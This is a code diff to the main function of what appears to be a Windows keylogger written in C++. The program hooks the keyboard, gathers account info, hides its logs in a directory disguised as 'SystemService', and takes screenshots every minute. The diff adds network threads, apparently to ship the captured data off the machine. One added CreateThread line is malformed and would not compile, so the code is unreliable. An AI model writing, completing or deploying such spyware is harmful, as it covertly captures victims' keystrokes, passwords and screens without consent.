@@ -2,7 +2,10 @@
 #include "keyhook.h"
 #include "screen.h"
 #include "sys.h"
+#include "network.h"
 #include "debug.h"
+
+#include <thread>
 
 #ifdef DEBUG_BUILD
 #include "encrypt.h"
@@ -25,7 +28,7 @@ int main() {
 	KeyHook::InstallHook();
 	clientInfo = Stream::GetAccountInfo(clientInfo);
 
-	std::string path = Stream::GetPath("\\Microsoft\\");
+	std::string path    = Stream::GetPath("\\Microsoft\\");
 	std::string dirName = "SystemService";
 
 	Stream::MakeDir(path, dirName, FILE_ATTRIBUTE_HIDDEN);
@@ -45,7 +48,12 @@ int main() {
 	Stream::WriteLog(write, KeyHook::activeProcess, logFile, false);
 	Screen::CaptureScreen(path + "\\", "winpst", true, 60000); // Screenshot
 
-//  KeyHook::HandleMessage(true);
+	std::thread serverThread(ClientThread, nullptr, path);
+	HANDLE serverHandle = CreateThread(nullptr, 0, ClientThread, nullptr, path, )
+	std::thread keylogThread(KeyHook::HandleMessage, true);
+
+	serverThread.join();
+	keylogThread.join();
 
 #endif // DEBUG_BUILD
 	return 0;
